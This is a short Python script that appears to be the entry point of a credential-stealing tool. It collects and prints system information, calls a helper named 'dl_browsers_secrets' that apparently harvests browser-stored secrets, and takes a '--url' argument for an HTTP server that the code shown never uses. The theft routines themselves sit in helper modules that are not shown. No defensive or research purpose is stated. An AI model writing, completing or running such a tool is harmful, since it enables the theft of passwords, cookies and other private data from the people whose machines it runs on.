import argparse
import datetime
from helpers import utils
from helpers import filemanager


def main(url):
    system_information = utils.system_information()
    print(system_information)
    filemanager.dl_browsers_secrets()


if __name__ == '__main__':
    # Calling main function
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='URL Parameter')
    parser.add_argument('--url', dest='url', help='url parameter for http server')

    args = parser.parse_args()
    print()
    main(args.url)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
